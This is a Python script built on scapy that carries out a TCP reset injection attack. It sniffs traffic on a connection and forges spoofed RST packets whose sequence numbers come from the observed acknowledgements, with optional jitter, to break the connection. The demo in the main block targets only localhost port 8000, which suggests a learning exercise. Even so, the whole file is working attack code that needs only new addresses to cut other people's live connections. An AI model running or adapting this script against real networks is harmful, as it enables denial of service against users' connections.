from scapy.all import *
import random

from scapy.layers.inet import TCP, IP

DEFAULT_WINDOW_SIZE = 2052


def log(msg, params=None):
    if params is None:
        params = {}
    formatted_params = " ".join([f"{k}={v}" for k, v in params.items()])
    print(f"{msg} {formatted_params}")


def is_packet_on_tcp_conn(server_ip, server_port, client_ip):
    def f(p):
        return (
                is_packet_tcp_server_to_client(server_ip, server_port, client_ip)(p) or
                is_packet_tcp_client_to_server(server_ip, server_port, client_ip)(p)
        )

    return f


def is_packet_tcp_server_to_client(server_ip, server_port, client_ip):
    def f(p):
        if not p.haslayer(TCP):
            return False

        src_ip = p[IP].src
        src_port = p[TCP].sport
        dst_ip = p[IP].dst

        return src_ip == server_ip and src_port == server_port and dst_ip == client_ip

    return f


def is_packet_tcp_client_to_server(server_ip, server_port, client_ip):
    def f(p):
        if not p.haslayer(TCP):
            return False

        src_ip = p[IP].src
        dst_ip = p[IP].dst
        dst_port = p[TCP].dport

        return src_ip == client_ip and dst_ip == server_ip and dst_port == server_port

    return f


def send_reset(iface, seq_jitter=0, ignore_syn=True):
    def f(p):
        src_ip = p[IP].src
        src_port = p[TCP].sport
        dst_ip = p[IP].dst
        dst_port = p[TCP].dport
        seq = p[TCP].seq
        ack = p[TCP].ack
        flags = p[TCP].flags

        log(
            "Grabbed packet",
            {
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "src_port": src_port,
                "dst_port": dst_port,
                "seq": seq,
                "ack": ack,
            }
        )

        if "S" in flags and ignore_syn:
            print("Packet has SYN flag, not sending RST")
            return

        jitter = random.randint(max(-seq_jitter, -seq), seq_jitter)
        if jitter == 0:
            print("jitter == 0, this RST packet should close the connection")

        rst_seq = ack + jitter
        p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)

        log(
            "Sending RST packet...",
            {
                "orig_ack": ack,
                "jitter": jitter,
                "seq": rst_seq,
            },
        )
        send(p, verbose=0, iface=iface)

    return f


if __name__ == "__main__":
    iface = "lo0"
    localhost_ip = "127.0.0.1"
    localhost_server_port = 8000

    print("Starting sniff...")
    t = sniff(
        iface=iface,
        count=50,
        prn=send_reset(iface),
        lfilter=is_packet_tcp_client_to_server(localhost_ip, localhost_server_port, localhost_ip))
    print("Finished sniffing!")

